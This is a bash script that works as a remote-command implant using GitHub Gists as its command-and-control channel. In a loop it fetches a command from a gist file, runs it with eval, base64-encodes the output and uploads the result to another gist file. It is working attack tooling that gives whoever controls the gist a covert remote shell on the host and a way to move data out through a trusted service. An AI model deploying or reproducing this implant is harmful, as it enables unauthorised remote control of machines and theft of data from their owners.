#!/bin/bash

GITHUB_API_KEY=""
GIST_ID=""
ETAG = ""

while true
do

  current_etag=$(curl -i -s https://api.github.com/gists/${GIST_ID})
  echo "${current_etag}"


  COMMAND=$(curl -s -L \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer ${GITHUB_API_KEY}" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/gists/${GIST_ID} | \
  python2 -c "import sys, json; print json.load(sys.stdin)['files']['send.txt']['content']")

  if [[ "${COMMAND}" != "@" ]]; then # if there is a command then do this!

      # get command from correct file and execute
      output=$(eval ${COMMAND} | base64 -w 0)
      curl -s -o /dev/null -L \
      -X PATCH \
      -H "Accept: application/vnd.github+json" \
      -H "Authorization: Bearer ${GITHUB_API_KEY}" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      https://api.github.com/gists/${GIST_ID} \
      -d '{"files":{"send.txt":{"content":"@"}}}'

      # output command to correct file
      curl -s -o /dev/null -L \
      -X PATCH \
      -H "Accept: application/vnd.github+json" \
      -H "Authorization: Bearer ${GITHUB_API_KEY}" \
      -H "X-GitHub-Api-Version: 2022-11-28" \
      https://api.github.com/gists/${GIST_ID} \
      -d "{\"files\":{\"receive.txt\":{\"content\":\"${output}\"}}}"
  fi
sleep 1
done
